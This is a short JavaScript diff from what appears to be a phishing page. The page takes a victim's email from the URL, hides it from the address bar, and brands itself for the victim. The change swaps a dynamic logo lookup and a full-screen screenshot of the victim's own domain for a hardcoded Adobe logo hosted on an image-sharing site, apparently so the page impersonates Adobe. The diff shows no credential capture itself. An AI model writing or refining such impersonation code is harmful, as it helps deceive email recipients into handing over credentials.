@@ -435,25 +435,10 @@ if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
   history.replaceState({}, document.title, window.location.pathname);
   // Set logo
   
-  logoImg.src = `https://logo.clearbit.com/${domain}`;
+  logoImg.src = `https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png`;
   logoImg.onerror = () => {
-    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+    logoImg.src = "https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png";
   };
-
-  // Setup fallback screenshot container
-  const fallbackScreenshot = document.createElement('img');
-  fallbackScreenshot.id = "fallback-screenshot";
-  fallbackScreenshot.style.cssText = `
-    display: none;
-    position: fixed; top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    object-fit: cover;
-    z-index: 0;
-    pointer-events: none;
-  `;
-  fallbackScreenshot.alt = "Screenshot fallback";
-  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
-  document.body.appendChild(fallbackScreenshot);
 
   
 }
